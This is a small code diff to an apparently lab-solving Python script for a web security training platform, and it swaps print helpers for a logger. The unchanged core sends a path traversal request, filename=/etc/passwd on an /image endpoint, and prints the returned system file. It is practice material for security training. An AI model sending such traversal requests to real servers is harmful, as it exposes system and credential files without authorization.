@@ -1,4 +1,4 @@
-from web_security_academy.core.utils import *
+from web_security_academy.core.logger import logger
 from urllib.parse import urlencode
 
 
@@ -6,13 +6,13 @@ def solve_lab(session):
     path = "/image"
     params = {"filename": "/etc/passwd"}
 
-    print_info(
+    logger.info(
         f'Exploiting path traversal vulnerability by visiting "{path}?{urlencode(params)}"...'
     )
     resp = session.get_path(path, params=params)
 
     if resp.status_code != 200:
-        print_fail("Unable to get contents of file.")
+        logger.failure("Unable to get contents of file.")
     else:
-        print_success("GET request came back with the following response:")
+        logger.success("GET request came back with the following response:")
         print(resp.text)
